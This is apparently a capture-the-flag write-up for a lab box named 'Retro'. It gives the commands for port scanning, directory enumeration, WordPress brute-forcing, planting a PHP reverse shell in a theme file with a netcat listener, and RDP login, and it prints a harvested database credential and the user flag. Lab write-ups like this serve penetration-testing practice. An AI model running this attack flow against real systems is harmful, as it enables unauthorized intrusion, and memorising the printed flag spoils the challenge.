# Retro

> New high score!

<br>

### Process:

1. port scan:
	- `sudo nmap -T4 10.10.38.58 -Pn`
	- `sudo nmap -T4 -A -p 80,3389 10.10.38.58 -Pn`
2. enumerate port 80:
	- visit website "http://10.10.38.58/" (default IIS homepage)
	- run gobuster: `gobuster dir -u http://10.10.38.58/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,bak,conf,txt,js`
		- found "retro"
		- hidden directory = **retro**
	- check for robots.txt -- not found
	- re-run gobuster: `gobuster dir -u http://10.10.38.58/retro -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,bak,conf,txt,js`
		- found wordpress directories 
	- run wpscan: `wpscan --url http://10.10.38.58/retro`
	- try to brute force login with found username "wade": `wpscan --url http://10.10.38.58/retro -U wade -P /usr/share/wordlists/rockyou.txt`
		- ...
	- reading blog posts on site revealled likely password
		- tried "wade:parzival" -- success
	- upload reverse shell:
		- go to “Appearance > Theme Editor > 404.php” and replace the PHP code with a [PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
		- setup a netcat listener: `nc -lvnp`
		- then call the template: `http://10.10.38.58/retro/wp-content/themes/90s-retro/404.php`
3. post-exploitation:
	- found MySQL password in "wp-config.php" file:
		- "worpressuser567:YSPgW[%C.mQE]"
	- login with RDP in remmina using wade credentials -- success
	- found user.txt flag
		- user flag = **3b99fbdc6d430bfb51c72c651a261927**
		- 
